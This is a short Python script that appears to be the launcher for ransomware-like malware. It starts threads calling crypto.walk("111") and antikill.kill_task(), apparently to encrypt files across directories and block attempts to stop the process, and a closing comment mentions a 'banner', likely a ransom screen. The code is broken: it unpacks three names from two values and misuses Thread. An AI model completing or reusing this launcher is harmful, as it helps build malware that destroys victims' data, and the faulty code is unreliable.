import antikill
import crypto
from threading import Thread

th_1, th_2, th_3 = Thread(crypto.walk("111")), Thread(antikill.kill_task())

if __name__ == '__main__':
    th_1.start(), th_2.start()
    th_1.join(), th_2.join()
    
#I haven't idea how to start banner
